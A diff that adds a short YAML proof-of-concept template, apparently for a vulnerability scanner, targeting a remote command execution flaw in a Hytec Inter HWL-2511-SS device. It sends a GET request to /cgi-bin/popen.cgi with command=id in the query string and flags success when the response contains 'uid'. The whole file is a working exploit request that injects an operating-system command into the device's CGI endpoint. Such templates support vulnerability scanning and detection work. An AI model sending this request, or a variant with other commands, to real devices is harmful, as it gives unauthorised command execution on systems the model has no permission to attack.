@@ -1,0 +1,17 @@
+name: Hytec-Inter-HWL-2511-SS-popen-cgi-rce
+set:
+  s1: randomInt(1000,9999)
+groups:
+  poc:  
+    - method: GET
+      path: /cgi-bin/popen.cgi?command=id
+      follow_redirects: false
+      search:  
+      headers:
+      body: 
+      expression: >-
+        response.status == 200 && response.body.bcontains(b"uid")
+detail: 
+  links: 
+  authors:
+  
